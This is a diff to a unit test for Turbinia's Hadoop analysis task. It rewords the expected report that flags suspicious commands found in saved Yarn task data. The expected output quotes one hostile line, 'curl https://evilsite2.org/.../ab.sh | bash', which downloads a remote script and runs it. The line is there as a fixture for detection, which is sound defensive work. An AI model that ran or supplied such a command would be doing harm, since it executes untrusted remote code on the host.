@@ -26,8 +26,7 @@ from turbinia.workers import hadoop
 class HadoopAnalysisTest(unittest.TestCase):
   """Tests for HadoopAnalysisTask."""
 
-  _EXPECTED_REPORT = """Extracted commands from Yarn tasks
-Found suspicious commands:
+  _EXPECTED_REPORT = """Found suspicious commands!
 	File: /usr/local/google/home/romaing/src/turbinia/turbinia/workers/../../test_data/bad_yarn_saved_task
 Command: "1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0"
 
